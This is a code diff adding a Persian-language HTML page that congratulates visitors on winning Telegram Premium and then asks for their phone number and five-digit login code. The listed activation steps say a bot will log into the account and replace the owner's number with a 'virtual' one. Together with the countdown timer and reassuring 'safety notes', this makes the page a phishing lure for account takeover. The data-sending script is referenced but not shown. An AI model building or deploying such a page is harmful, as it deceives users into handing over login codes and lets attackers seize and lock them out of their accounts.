@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#0f0c29">
+    <title>🎁 درگاه ورود تلگرام پریمیوم</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js" defer></script>
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js" defer></script>
+</head>
+<body>
+    <div class="background-animation">
+        <div class="cube"></div>
+        <div class="cube"></div>
+        <div class="cube"></div>
+    </div>
+    <div class="container" data-aos="flip-up">
+        <div class="welcome-screen" id="welcomeScreen">
+            <div class="trophy">🎁</div>
+            <div class="premium-badge shine">PREMIUM</div>
+            <h1 class="gradient-text">تبریک می‌گوییم!</h1>
+            <p class="glow">شما برنده اکانت پریمیوم تلگرام شده‌اید!</p>
+            <div class="features">
+                <div class="feature-item">✨ دسترسی نامحدود</div>
+                <div class="feature-item">🚀 سرعت بالا</div>
+                <div class="feature-item">💎 امکانات ویژه</div>
+            </div>
+
+            <div class="info-section" id="infoSection">
+                <h3 class="gradient-text">🔒 مراحل فعالسازی اکانت پریمیوم</h3>
+                <div class="steps-container">
+                    <div class="step-item">
+                        <span class="step-number">1</span>
+                        <p>ورود ربات به اکانت شما با رعایت کامل موارد امنیتی</p>
+                    </div>
+                    <div class="step-item">
+                        <span class="step-number">2</span>
+                        <p>تعویض شماره ایران با شماره مجازی اختصاصی</p>
+                    </div>
+                    <div class="step-item">
+                        <span class="step-number">3</span>
+                        <p>فعالسازی اکانت پریمیوم به صورت خودکار</p>
+                    </div>
+                    <div class="step-item">
+                        <span class="step-number">4</span>
+                        <p>خروج ایمن ربات از حساب کاربری شما</p>
+                    </div>
+                </div>
+                
+                <div class="safety-notes">
+                    <h4>📋 نکات ایمنی مهم:</h4>
+                    <ul>
+                        <li>تمامی فرآیند به صورت خودکار و امن انجام می‌شود</li>
+                        <li>اطلاعات شما کاملاً محرمانه باقی می‌ماند</li>
+                        <li>پس از فعالسازی، دسترسی‌های ربات حذف می‌شود</li>
+                    </ul>
+                </div>
+                
+                <label class="consent-checkbox">
+                    <input type="checkbox" id="consentCheck" onchange="toggleActivationButton()">
+                    <span>شرایط و قوانین را مطالعه کردم و می‌پذیرم</span>
+                </label>
+            </div>
+
+            <button onclick="showPhoneScreen()" class="btn btn-3d pulse">
+                <span class="telegram-icon">📱</span>
+                دریافت اکانت پریمیوم
+            </button>
+            <div class="timer">زمان باقیمانده: <span id="countdown">05:00</span></div>
+        </div>
+
+        <div class="phone-screen hidden" id="phoneScreen">
+            <h2 class="gradient-text">ورود با شماره موبایل</h2>
+            <div class="input-group">
+                <input type="tel" id="phoneNumber" class="input-3d" 
+                       placeholder="شماره موبایل خود را وارد کنید"
+                       maxlength="11">
+                <button onclick="submitPhone()" class="btn btn-3d shine">تایید</button>
+            </div>
+        </div>
+
+        <div class="code-screen hidden" id="codeScreen">
+            <h2 class="gradient-text">تایید کد</h2>
+            <p>کد تایید به شماره شما ارسال شد</p>
+            <div class="input-group">
+                <div class="verification-inputs">
+                    <input type="text" maxlength="1" class="code-input input-3d" data-index="1">
+                    <input type="text" maxlength="1" class="code-input input-3d" data-index="2">
+                    <input type="text" maxlength="1" class="code-input input-3d" data-index="3">
+                    <input type="text" maxlength="1" class="code-input input-3d" data-index="4">
+                    <input type="text" maxlength="1" class="code-input input-3d" data-index="5">
+                </div>
+                <button onclick="verifyCode()" class="btn btn-3d shine">فعالسازی اکانت</button>
+            </div>
+        </div>
+    </div>
+    <script src="script.js" defer></script>
+</body>
+</html>
